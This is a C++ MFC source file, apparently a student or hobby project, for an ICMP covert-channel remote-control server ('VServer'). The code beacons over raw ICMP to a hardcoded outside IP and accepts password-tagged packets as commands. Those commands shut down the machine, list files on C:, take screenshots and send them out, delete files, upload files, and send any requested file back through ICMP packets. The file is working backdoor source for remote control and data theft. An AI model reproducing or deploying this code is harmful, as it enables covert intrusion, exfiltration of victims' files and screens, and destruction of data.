// VServerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "VServer.h"
#include "VServerDlg.h"
#include "afxdialogex.h"
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib,"wsock32.lib")
#pragma comment(lib, "Ws2_32.lib") 

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define ICMP_ECHO 8
#define ICMP_ECHOREPLY 0
#define ICMP_MIN 8 // minimum 8 byte icmp packet (just header)
#define ICMP_PASSWORD 1234
#define ICMP_DEST_IP "127.0.0.1"    //客户端的ip地址
#define ICMP_DEST_IP1 "207.46.230.218"   //任意ip地址

UINT Capturer(PVOID hWnd);

//IP首部
typedef struct iphdr 
{
	unsigned int h_len : 4; //4位首部长度
	unsigned int version : 4; //IP版本号，4表示IPV4
	unsigned char tos; //8位服务类型TOS
	unsigned short total_len; //16位总长度（字节）
	unsigned short ident; //16位标识
	unsigned short frag_and_flags; //3位标志位
	unsigned char ttl; //8位生存时间 TTL
	unsigned char proto; //8位协议 (TCP, UDP 或其他)
	unsigned short checksum; //16位IP首部校验和
	unsigned int sourceIP; //32位源IP地址
	unsigned int destIP; //32位目的IP地址
}IpHeader;

//定义ICMP首部
typedef struct _ihdr
{
	BYTE i_type; //8位类型
	BYTE i_code; //8位代码
	USHORT i_cksum; //16位校验和 
	USHORT i_id; //识别号（一般用进程号作为识别号）
	USHORT i_seq; //报文序列号 
	ULONG timestamp; //时间戳
}IcmpHeader;

#define STATUS_FAILED 0xFFFF
#define DEF_PACKET_SIZE 1200
#define MAX_PACKET 6500
#define xmalloc(s) HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,(s))
#define xfree(p) HeapFree (GetProcessHeap(),0,(p))

WSADATA wsaData;
SOCKET sockRaw = (SOCKET)NULL;
struct sockaddr_in dest, from;
struct hostent * hp;
int bread, datasize, retval, bwrote;
char *icmp_data,*recvbuf;
int fromlen;
int timeout;
unsigned addr;
USHORT seq_no;
CString SFileName;
CFile rFile,rwFile;

char Buf[DEF_PACKET_SIZE];

//CString SFileName;
char * s = new char[1000], *t;

//计算icmp校验和
USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;
	while (size >1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (USHORT)(~cksum);
}

void fill_icmp_data(char * icmp_data, int k)
{
	int i;
	char SendMsg[20] = "Hello World!";
	IcmpHeader *icmp_hdr;
	char *datapart;
	icmp_hdr = (IcmpHeader*)icmp_data;
	icmp_hdr->i_type = ICMP_ECHOREPLY;
	icmp_hdr->i_code = 0;
	icmp_hdr->i_id = (USHORT)GetCurrentProcessId();
	icmp_hdr->i_cksum = 0;
	icmp_hdr->i_seq = 0;
	datapart = icmp_data + sizeof(IcmpHeader);

	if (k == 0)
	{
		for (i = 0; i<sizeof(SendMsg); i++)
		{
			datapart[i] = SendMsg[i];
		}
	}
	if (k == 1)
	{
		icmp_hdr->i_code = 9;
		memcpy(datapart, t, 1000);
	}
	if (k == 10)
	{
		icmp_hdr->i_code = 10;
		memcpy(datapart, Buf, DEF_PACKET_SIZE);
	}
	if (k == 11)
		icmp_hdr->i_code = 11;
}
//查找c盘文件
void   Recurse(LPCTSTR   pstr)
{
	CFileFind   finder;
	CString   str;
	memset(s, 0, 1000);
	t = s;
	//   build   a   string   with   wildcards   
	CString   strWildcard(pstr);
	strWildcard += _T("\\*.*");
	//   start   working   for   files   
	BOOL   bWorking = finder.FindFile(strWildcard);
	while (bWorking)
	{
		bWorking = finder.FindNextFile();
		//   skip   .   and   ..   files;   otherwise,   we'd   
		//   recur   infinitely!   
		if (finder.IsDots() || finder.IsDirectory())
			continue;
		//   if   it's   a   directory,   recursively   search   it   
		str = finder.GetFileName();   //
		strncpy(s, str, str.GetLength());
		s += str.GetLength() + 1;
	}
	finder.Close();
}
//截屏的操作
void CapScreen(CString filename)
{
	CDC *pDC;
	pDC = CDC::FromHandle(GetDC(GetDesktopWindow()));
	if (pDC == NULL) return;
	int BitPerPixel = pDC->GetDeviceCaps(BITSPIXEL);
	int Width = pDC->GetDeviceCaps(HORZRES);
	int Height = pDC->GetDeviceCaps(VERTRES);

	CDC memDC;
	if (memDC.CreateCompatibleDC(pDC) == 0) return;

	CBitmap memBitmap, *oldmemBitmap;
	if (memBitmap.CreateCompatibleBitmap(pDC, Width, Height) == NULL) return;

	oldmemBitmap = memDC.SelectObject(&memBitmap);
	if (oldmemBitmap == NULL) return;
	if (memDC.BitBlt(0, 0, Width, Height, pDC, 0, 0, SRCCOPY) == 0) return;

	BITMAP bmp;
	memBitmap.GetBitmap(&bmp);

	FILE *fp = fopen(filename, "w+b");

	BITMAPINFOHEADER bih = { 0 };
	bih.biBitCount = bmp.bmBitsPixel;
	bih.biCompression = BI_RGB;
	bih.biHeight = bmp.bmHeight;
	bih.biPlanes = 1;
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biSizeImage = bmp.bmWidthBytes * bmp.bmHeight;
	bih.biWidth = bmp.bmWidth;

	BITMAPFILEHEADER bfh = { 0 };
	bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	bfh.bfSize = bfh.bfOffBits + bmp.bmWidthBytes * bmp.bmHeight;
	bfh.bfType = (WORD)0x4d42;

	fwrite(&bfh, 1, sizeof(BITMAPFILEHEADER), fp);
	fwrite(&bih, 1, sizeof(BITMAPINFOHEADER), fp);

	byte * p = new byte[bmp.bmWidthBytes * bmp.bmHeight];

	GetDIBits(memDC.m_hDC,
		(HBITMAP)memBitmap.m_hObject,
		0,
		Height,
		p,
		(LPBITMAPINFO)&bih,
		DIB_RGB_COLORS);

	fwrite(p, 1, bmp.bmWidthBytes * bmp.bmHeight, fp);
	
	delete[] p;
	fclose(fp);
	memDC.SelectObject(oldmemBitmap);
}
//解析报文命令并进行不同操作
void decode_resp(char *buf, int bytes, struct sockaddr_in *from)

{
	CVServerApp* pApp = (CVServerApp*)AfxGetApp();
	CVServerDlg* pDlg = (CVServerDlg*)pApp->m_pMainWnd;

	int i;
	char *instead, *instead1, *name;
	instead = (char *)xmalloc(MAX_PACKET);
	instead1 = (char *)xmalloc(MAX_PACKET);

	IpHeader *iphdr;
	IcmpHeader *icmphdr;
	unsigned short iphdrlen;
	iphdr = (IpHeader *)buf;
	iphdrlen = iphdr->h_len * 4;
	icmphdr = (IcmpHeader*)(buf + iphdrlen);
	CString str;
	int len, length, bao;

	if (icmphdr->i_seq == ICMP_PASSWORD)//报文中携带的密码正确则输出数据段
	{
		//打印接收到的信息
		str.Format("%d bytes from %s: IcmpType %d IcmpCode %d", bytes, inet_ntoa(from->sin_addr), icmphdr->i_type, icmphdr->i_code);
		pDlg->m_show.InsertString(-1, str);

		switch (icmphdr->i_code)
		{
		case 0:		
			str = "——————— 输出命令———————— ";
			pDlg->m_show.InsertString(-1, str);
			str.Format("%s", (buf + iphdrlen + 12));
			pDlg->m_show.InsertString(-1, str);
			break;
		case 1:
			str = "————————关机命令———————— ";
			pDlg->m_show.InsertString(-1, str);
			str = "十分钟后即将关机……";
			pDlg->m_show.InsertString(-1, str);
			system("shutdown -s -t 600");    //控制十分钟后关机命令行
			break;	
		case 2:
			str = "————————取消关机命令———————— ";
			pDlg->m_show.InsertString(-1, str);
			str = "取消系统关机";
			pDlg->m_show.InsertString(-1, str);
			system("shutdown -a");      //取消关机命令行
			break;
		case 3:
			str = "——————获取C盘文件列表——————— ";
			pDlg->m_show.InsertString(-1, str);
			Recurse(_T("C:\\"));

			dest.sin_addr.s_addr = inet_addr(ICMP_DEST_IP);
			fill_icmp_data(instead, 1);
			((IcmpHeader*)instead)->timestamp = GetTickCount();
			((IcmpHeader*)instead)->i_seq = ICMP_PASSWORD;
			((IcmpHeader*)instead)->i_cksum = checksum((USHORT*)instead, datasize);

			bwrote = sendto(sockRaw, instead, datasize, 0, (struct sockaddr*)&dest, sizeof(dest));  //发送
			if (bwrote == SOCKET_ERROR)
			{
				if (WSAGetLastError() == WSAETIMEDOUT)
				{
					pDlg->m_show.InsertString(-1, "Timed out \n");
				}
				str.Format("sendto failed: %d\n", WSAGetLastError());
				AfxMessageBox(str);
			}
			else   //发送成功
			{
				str.Format("\nSend Packet to %s Success! \n", ICMP_DEST_IP);
				pDlg->m_show.InsertString(-1, str);
			}
			if (bwrote<datasize)  
			{
				str.Format("Wrote %d bytes \n", bwrote);
				AfxMessageBox(str);
			}
			dest.sin_addr.s_addr = inet_addr(ICMP_DEST_IP1);
			break;

		case 4:
			str = "————————截屏———————— ";
			pDlg->m_show.InsertString(-1, str);
			str = "c:\\map.bmp";
			CapScreen(str);
			if (!rwFile.Open(str, CFile::modeRead, NULL))                //打开文件
			{
				AfxMessageBox("无法打开文件!");
			}
			length = rwFile.GetLength();
			bao = length;
			while (length>0)
			{
				memset(&Buf, 0, sizeof(Buf));
				len = rwFile.Read(Buf, DEF_PACKET_SIZE);
				length = length - len;
				fill_icmp_data(instead1, 10);
				((IcmpHeader*)instead1)->timestamp = GetTickCount();
				((IcmpHeader*)instead1)->i_seq = ICMP_PASSWORD;
				((IcmpHeader*)icmp_data)->i_code = 10;
				((IcmpHeader*)instead1)->i_cksum = checksum((USHORT*)instead1, datasize);
				dest.sin_addr.s_addr = inet_addr(ICMP_DEST_IP);

				bwrote = sendto(sockRaw, instead1, datasize, 0, (struct sockaddr*)&dest, sizeof(dest));  //发送
				Sleep(10);
				if (bwrote == SOCKET_ERROR)
				{
					if (WSAGetLastError() == WSAETIMEDOUT)
					{
						pDlg->m_show.InsertString(-1, "Timed out \n");
					}
					str.Format("sendto failed: %d\n", WSAGetLastError());
					AfxMessageBox(str);
				}
				else       //发送成功
				{
					str.Format("\nSend Packet to %s Success! \n", ICMP_DEST_IP);
					pDlg->m_show.InsertString(-1, str);
				}
				if (bwrote<datasize)
				{
					str.Format("Wrote %d bytes \n", bwrote);   //写文件
					AfxMessageBox(str);
				}
			}
			rwFile.Close();

			fill_icmp_data(icmp_data, 11);
			((IcmpHeader*)icmp_data)->timestamp = GetTickCount();
			((IcmpHeader*)icmp_data)->i_seq = ICMP_PASSWORD;
			((IcmpHeader*)icmp_data)->i_cksum = checksum((USHORT*)icmp_data, datasize);

			bwrote = sendto(sockRaw, icmp_data, datasize, 0, (struct sockaddr*)&dest, sizeof(dest));
			dest.sin_addr.s_addr = inet_addr(ICMP_DEST_IP1);
			break;
		case 5:
			str = "————————删除选择文件———————— ";
			pDlg->m_show.InsertString(-1, str);
			str = CString(buf + iphdrlen + 12);
			DeleteFile("c:\\" + str);
			break;
		case 6:
			str = "————————上传文件———————— ";
			pDlg->m_show.InsertString(-1, str);

			if (!rFile.Open(SFileName, CFile::modeReadWrite | CFile::modeCreate | CFile::modeNoTruncate))
			{
				AfxMessageBox("无法打开文件!");
			}
			rFile.Seek(0, CFile::end);      
			instead = (buf + iphdrlen + 12);
			rFile.Write(instead, DEF_PACKET_SIZE);
			rFile.Close();
			break;
		case 7:
			str = "————————下载文件———————— ";
			pDlg->m_show.InsertString(-1, str);
			str = CString(buf + iphdrlen + 12);
			AfxMessageBox("C:\\" + str);
			if (!rwFile.Open("C:\\" + str, CFile::modeRead, NULL))                //打开文件
			{
				AfxMessageBox("无法打开文件!");
			}
			length = rwFile.GetLength();
			bao = length;
			while (length>0)
			{
				memset(&Buf, 0, sizeof(Buf));
				len = rwFile.Read(Buf, DEF_PACKET_SIZE);
				length = length - len;

				fill_icmp_data(instead1, 10);
				((IcmpHeader*)instead1)->timestamp = GetTickCount();
				((IcmpHeader*)instead1)->i_seq = ICMP_PASSWORD;
				((IcmpHeader*)icmp_data)->i_code = 10;
				((IcmpHeader*)instead1)->i_cksum = checksum((USHORT*)instead1, datasize);
				dest.sin_addr.s_addr = inet_addr(ICMP_DEST_IP);

				bwrote = sendto(sockRaw, instead1, datasize, 0, (struct sockaddr*)&dest, sizeof(dest));  //发送
				if (bwrote == SOCKET_ERROR)
				{
					if (WSAGetLastError() == WSAETIMEDOUT)
					{
						pDlg->m_show.InsertString(-1, "Timed out \n");
					}
					str.Format("sendto failed: %d\n", WSAGetLastError());
					AfxMessageBox(str);
				}
				else   //发送成功
				{
					str.Format("\nSend Packet to %s Success! \n", ICMP_DEST_IP);
					pDlg->m_show.InsertString(-1, str);
				}
				if (bwrote<datasize)      //写文件
				{
					str.Format("Wrote %d bytes \n", bwrote);
					AfxMessageBox(str);
				}
			}
			rwFile.Close();

			fill_icmp_data(icmp_data, 11);
			((IcmpHeader*)icmp_data)->timestamp = GetTickCount();
			((IcmpHeader*)icmp_data)->i_seq = ICMP_PASSWORD;
			((IcmpHeader*)icmp_data)->i_cksum = checksum((USHORT*)icmp_data, datasize);
			bwrote = sendto(sockRaw, icmp_data, datasize, 0, (struct sockaddr*)&dest, sizeof(dest));
			dest.sin_addr.s_addr = inet_addr(ICMP_DEST_IP1);
			break;
		default:
			str = "没有匹配的命令!";
			pDlg->m_show.InsertString(-1, str);
		}
	}
	else
	{
		str = "Other ICMP Packets!\n";
		pDlg->m_show.InsertString(-1, str);
	}
}

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CVServerDlg 对话框



CVServerDlg::CVServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_VSERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CVServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_show);
}

BEGIN_MESSAGE_MAP(CVServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDCANCEL, &CVServerDlg::OnBnClickedCancel)
END_MESSAGE_MAP()


// CVServerDlg 消息处理程序

BOOL CVServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	fromlen = sizeof(from);

	timeout = 1000;
	addr = 0;

	seq_no = 0;
	SFileName = "C:\\receive.txt";
	CString str;

	if ((retval = WSAStartup(MAKEWORD(2, 1), &wsaData)) != 0)
	{
		str.Format("WSAStartup failed: %d\n", retval);
		AfxMessageBox(str);

		//	fprintf(stderr,"WSAStartup failed: %d\n",retval);
		ExitProcess(STATUS_FAILED);

	}
	//WSA设置
	sockRaw = WSASocket(AF_INET, SOCK_RAW, IPPROTO_ICMP, NULL, 0, WSA_FLAG_OVERLAPPED);
	if (sockRaw == INVALID_SOCKET)
	{
		str.Format("WSASocket() failed: %d\n", WSAGetLastError());
		AfxMessageBox(str);
		//fprintf(stderr,"WSASocket() failed: %d\n",WSAGetLastError());

		ExitProcess(STATUS_FAILED);
	}
	{
		bread = setsockopt(sockRaw, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
		if (bread == SOCKET_ERROR)
		{
			str.Format("failed to set recv timeout: %d\n", WSAGetLastError());
			AfxMessageBox("failed to set recv timeout: %d\n", WSAGetLastError());
		}

		bread = setsockopt(sockRaw, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
		if (bread == SOCKET_ERROR)
		{
			str.Format("failed to set send timeout: %d\n", WSAGetLastError());
			AfxMessageBox(str);
		}

		memset(&dest, 0, sizeof(dest));
		dest.sin_family = AF_INET;
		dest.sin_addr.s_addr = inet_addr(ICMP_DEST_IP1);
		datasize = DEF_PACKET_SIZE;
		datasize += sizeof(IcmpHeader);
		icmp_data = (char *)xmalloc(MAX_PACKET);
		recvbuf = (char *)xmalloc(MAX_PACKET);
		if (!icmp_data)
		{
			str.Format("HeapAlloc failed %d\n", GetLastError());
			AfxMessageBox(str);
		}
	}
	memset(icmp_data, 0, MAX_PACKET);
	//开始线程
	AfxBeginThread(Capturer, NULL, THREAD_PRIORITY_NORMAL);
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CVServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CVServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CVServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CVServerDlg::OnBnClickedCancel()
{
	// TODO: 在此添加控件通知处理程序代码
	CDialogEx::OnCancel();
}
//线程入口函数
UINT Capturer(PVOID hWnd)
{
	CString str;
	// TODO: Add extra validation here
	while (1)
	{
		static int nCount = 0;
		fill_icmp_data(icmp_data, datasize);
		((IcmpHeader*)icmp_data)->i_cksum = 0;
		((IcmpHeader*)icmp_data)->timestamp = GetTickCount();
		((IcmpHeader*)icmp_data)->i_seq = ICMP_PASSWORD;
		((IcmpHeader*)icmp_data)->i_cksum = checksum((USHORT*)icmp_data, datasize);
		//发送报文
		bwrote = sendto(sockRaw, icmp_data, datasize, 0, (struct sockaddr*)&dest, sizeof(dest));
		//接收报文
		bread = recvfrom(sockRaw, recvbuf, MAX_PACKET, 0, (struct sockaddr*)&from, &fromlen);
		if (bread == SOCKET_ERROR)
		{
			if (WSAGetLastError() == WSAETIMEDOUT)
			{
				continue;
			}
			str.Format("recvfrom failed: %d\n", WSAGetLastError());
			AfxMessageBox(str);
		}
		//解析报文
		decode_resp(recvbuf, bread, &from);
		memset(recvbuf, 0, MAX_PACKET);
	}
	if (sockRaw != INVALID_SOCKET) closesocket(sockRaw);
	WSACleanup();
}